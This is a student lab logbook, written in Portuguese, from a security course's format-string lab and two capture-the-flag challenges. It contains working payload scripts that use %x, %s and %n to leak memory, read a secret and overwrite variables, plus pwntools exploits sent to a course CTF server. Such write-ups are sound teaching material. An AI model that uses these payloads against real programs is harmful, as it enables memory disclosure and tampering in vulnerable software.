# LOGBOOK 7

## Tarefa 1

Nesta tarefa tinhamos como objetivo causar o crash do servidor.

**Código injetado para o servidor.**<br>

![image 1](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180216.png)

**Servidor sem crash, ou seja, aparece:**<br>
`(^_^)(^_^)  Returned properly (^_^)(^_^)`

![image 2](docs/images/Captura_de_ecr%C3%A3_2023-11-17_175035.png)

**Código injetado que causa crash do servidor.**<br>

![image 3](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180241.png)

**Servidor com crash, ou seja, não aparece:**<br>
`(^_^)(^_^)  Returned properly (^_^)(^_^)`<br>

![image 4](docs/images/Captura_de_ecr%C3%A3_2023-11-17_180302.png)

## Tarefa 2.A

Nesta tarefa tinhamos de descubrir quantos %x eram necessários para fazer print dos 4 primeiros bytes do input. Escolhemos `@@@@`, pois podemos identificá-lo facilmente por `0x40404040`.

**Código que injetamos, com 64 vezes `%x`.**<br>

![image 5](docs/images/Captura_de_ecr%C3%A3_2023-11-17_184517.png)

**Servidor com `0x40404040`.**<br>

![image 6](docs/images/Captura_de_ecr%C3%A3_2023-11-17_184539.png)

## Tarefa 2.B

Nesta tarefa tinhamos de usar o conhecimento obtido na tarefa 2.A para obter uma mensagem secreta do servidor.
Para isso, modificámos o *build_string.py* que nos foi disponibilizada.

***build_string.py* usada.**<br>

```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "%s"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```
**Servidor com a mensagem secreta.**<br>

![image 7](docs/images/Captura_de_ecr%C3%A3_2023-11-17_191650.png)

## Tarefa 3.A

Nesta tarefa tinhamos como objetivo alterar o `target` para qualquer valor. Para esse fim usamos `%n`.

***build_string.py* usada.**<br>
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*63 + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

**Servidor com o `target` alterado.**<br>

![image 8](docs/images/Captura_de_ecr%C3%A3_2023-11-17_194820.png)

## Tarefa 3.B

Nesta tarefa tinhamos como objetivo alterar o valor do `target`para `0x5000`. Como `0x5000` em decimal é `20480` acrescentámos `19980` bytes antes do `%n` na forma de `%x`.

***build_string.py* usada.**<br>
```python
#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

# This line shows how to store a 4-byte string at offset 4
#content[4:8]  =  ("abcd").encode('latin-1')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
s = "%.8x"*62 + "%19980x" + "%n"

# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
  f.write(content)
```

**Servidor com o `target` alterado para `0x5000`.**<br>
![image 9](docs/images/Captura_de_ecr%C3%A3_2023-11-17_195730.png)

## CTF - Desafio 1

### Investigação

- Usámos `checksec program` para conseguir as seguintes informações:<br>

![image 10](docs/images/Captura_de_ecr%C3%A3_2023-11-18_011153.png)

- `program` tem um *canary* o que dificulta *stack smashing attacks*.

- O NX está ativado o que previne *buffer overflow*.

- PIE está desativado, logo o programa e os ficheiros estão sempre nas mesmas posições o que significa que é mais fácil de os localizar.

### Vulnerabilidade e Exploit

- O código `printf(buffer);` é uma Vulnerabilidade, pois não expecifica o formato da string de que vai fazer print
o que nos permite usar para conseguir ver a `flag`.

- A `flag` está carregada na memória e pode ser acessada com `%s`.

- Com o uso de **gdb** podemos chegar obter o endereço da `flag`.<br>

![image 11](docs/images/Captura_de_ecr%C3%A3_2023-11-18_012832.png)

- O endereço da `flag`, `0x804c060` em little endian de 32 bits é `\x60\xC0\x04\x08` que concatenamos com `%s` e colocamos no *exploit_example.py* para obter a `flag`.

```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\x60\xC0\x04\x08%s")
p.interactive()
```

**Flag obtida após executar o exploit.**<br>

![image 12](docs/images/Captura_de_ecr%C3%A3_2023-11-18_013800.png)

## CTF - Desafio 2

### Investigação

- Usámos `checksec program` para conseguir as seguintes informações:<br>

![image 13](docs/images/Captura_de_ecr%C3%A3_2023-11-18_025859.png)

- `program` tem um *canary* o que dificulta *stack smashing attacks*.
- O NX está ativado o que previne *buffer overflow*.
- PIE está desativado, logo o programa e os ficheiros estão sempre nas mesmas posições o que significa que é mais fácil de os localizar.

### Vulnerabilidade e Exploit

- O código `printf(buffer);` é uma Vulnerabilidade, pois não expecifica o formato da string de que vai fazer print
o que nos permite usar para modificar a variável `key`, com o uso do formatador `%n`, para o valor de `0xbeef` que nos dá acesso à `flag`.

- Com o uso de **gdb** podemos chegar obter o endereço da variável `key`.<br>

![image 15](docs/images/Captura_de_ecr%C3%A3_2023-11-18_030921.png)

- O `buffer` está `4 bytes` mais elevado na stack necessitando de inserir `4 bytes`, `@@@@` por exemplo, antes do endereço da variável `key`.

- O endereço da variável `key`, `0x804b324` em little endian de 32 bits é `\x24\xb3\x04\x08`.

- Como `0xbeef` corresponde a `48879 bytes` é necessário adicionar mais `48871 bytes` antes do formatador `%n`, ou seja, concatenámos `%48871x` e `%n`.

***exploit_example.py* usado para ter acesso à `flag`.**<br>

```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:
    p = remote("ctf-fsi.fe.up.pt", 4005)

p.recvuntil(b"...")
p.sendline(b"@@@@" + b"\x24\xb3\x04\x08" + b"%48871x" + b"%n")
p.interactive()
```

**Flag obtida após o exploit**<br>

![image 15](docs/images/Captura_de_ecr%C3%A3_2023-11-18_022316.png)
